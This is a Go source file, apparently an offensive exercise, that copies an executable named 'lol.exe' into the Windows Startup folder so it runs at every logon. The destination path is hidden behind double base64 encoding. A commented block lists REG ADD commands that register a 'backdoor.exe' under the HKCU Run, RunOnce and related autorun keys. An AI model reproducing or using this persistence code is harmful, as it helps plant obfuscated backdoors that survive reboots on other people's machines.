package main

import (
	"encoding/base64"
	"fmt"
	"io"
	"os"
)

func main() {
	fmt.Println("Hello World!!!")
	srcd, err := os.Getwd()
	fmt.Println(srcd)
	src := srcd + "\\lol.exe"
	hErr(err)
	mth1(src)
}

//C:\Users\lab\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\
//single back: UXpwY1ZYTmxjbk5jYkdGaVhFRndjRVJoZEdGY1VtOWhiV2x1WjF4TmFXTnliM052Wm5SY1YybHVaRzkzYzF4VGRHRnlkQ0JOWlc1MVhGQnliMmR5WVcxelhGTjBZWEowZFhCY2JHOXNMbVY0WlE9PQ==
//double: UXpwY1hGVnpaWEp6WEZ4c1lXSmNYRUZ3Y0VSaGRHRmNYRkp2WVcxcGJtZGNYRTFwWTNKdmMyOW1kRnhjVjJsdVpHOTNjMXhjVTNSaGNuUWdUV1Z1ZFZ4Y1VISnZaM0poYlhOY1hGTjBZWEowZFhCY1hHeHZiQzVsZUdVPQ==
//b64 st men
func mth1(src string) {
	dest := "UXpwY1ZYTmxjbk5jYkdGaVhFRndjRVJoZEdGY1VtOWhiV2x1WjF4TmFXTnliM052Wm5SY1YybHVaRzkzYzF4VGRHRnlkQ0JOWlc1MVhGQnliMmR5WVcxelhGTjBZWEowZFhCY2JHOXNMbVY0WlE9PQ=="
	dst, err := base64.StdEncoding.DecodeString(dest)
	hErr(err)
	dt, err := base64.StdEncoding.DecodeString(string(dst))
	hErr(err)

	fmt.Println(src)
	fmt.Println(string(dt))

	sourceFile, err := os.Open(src)
	hErr(err)
	defer sourceFile.Close()

	newFile, err := os.Create(string(dt))
	hErr(err)
	defer newFile.Close()

	io.Copy(newFile, sourceFile)
	hErr(err)
}

//registry
/*
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v lol /t REG_SZ /d "C:\Users\user\backdoor.exe"
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v lol /t REG_SZ /d "C:\Users\user\backdoor.exe"
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v lol /t REG_SZ /d "C:\Users\user\backdoor.exe"
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v lol /t REG_SZ /d "C:\Users\user\backdoor.exe"
*/
func mth2() {

}

func mth3() {

}

func hErr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}
